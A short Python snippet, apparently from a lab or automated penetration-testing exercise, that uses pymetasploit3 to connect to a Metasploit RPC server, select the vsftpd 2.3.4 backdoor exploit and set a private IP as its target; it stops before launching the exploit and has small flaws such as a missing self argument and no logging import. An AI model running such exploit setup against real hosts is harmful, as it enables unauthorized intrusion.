from pymetasploit3.msfrpc import MsfRpcClient

class InfiltrationTask:
    
    def exploit():
        
        client = MsfRpcClient('', ssl=True)
        logging.info(client.modules.exploits)
        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = '172.16.14.145' # IP of our target host
        logging.info(exploit.targetpayloads())

    
